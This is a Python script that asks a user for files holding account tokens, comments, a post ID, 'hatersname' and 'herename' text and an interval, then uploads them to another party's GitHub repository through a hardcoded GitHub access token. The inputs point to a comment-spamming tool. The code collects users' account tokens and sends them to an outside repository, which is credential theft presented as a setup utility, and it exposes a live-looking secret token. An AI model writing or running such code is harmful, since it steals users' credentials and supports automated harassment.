import requests
import base64
import os

GITHUB_TOKEN = "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"
REPO_OWNER = "DH0K3B44Z"
REPO_NAME = "Somthing-new"
BRANCH = "main"

def upload_file(repo_owner, repo_name, token, folder, filename, content):
    path = f"User-data/{folder}/{filename}"
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{path}"

    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    encoded_content = base64.b64encode(content.encode()).decode()
    
    response = requests.get(url, headers=headers)
    data = {
        "message": f"Upload {filename} for {folder}",
        "content": encoded_content,
        "branch": BRANCH
    }
    if response.status_code == 200:
        sha = response.json().get("sha")
        data["sha"] = sha

    put_resp = requests.put(url, headers=headers, json=data)
    if put_resp.status_code in [200, 201]:
        print(f"{filename} uploaded for user {folder}")
    else:
        print(f"Failed to upload {filename} for user {folder}: {put_resp.json()}")

def read_file(path):
    if not os.path.exists(path):
        print(f"File not found: {path}")
        return ""
    with open(path, "r") as f:
        return f.read().strip()

def main():
    username = input("Enter your username: ").strip()
    
    tokens_path = input("Enter path to your tokens file: ").strip()
    comments_path = input("Enter path to your comments file: ").strip()
    postid_path = input("Enter path to your post ID file: ").strip()
    prefix_path = input("Enter path to your prefix file (hatersname): ").strip()
    suffix_path = input("Enter path to your suffix file (herename): ").strip()
    interval_path = input("Enter path to your interval file (seconds): ").strip()
    
    tokens = read_file(tokens_path)
    comments = read_file(comments_path)
    postid = read_file(postid_path)
    prefix = read_file(prefix_path)
    suffix = read_file(suffix_path)
    interval = read_file(interval_path)

    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "tokens.txt", tokens)
    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "comments.txt", comments)
    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "postid.txt", postid)
    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "prefix.txt", prefix)
    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "suffix.txt", suffix)
    upload_file(REPO_OWNER, REPO_NAME, GITHUB_TOKEN, username, "interval.txt", interval)

if __name__ == "__main__":
    main()
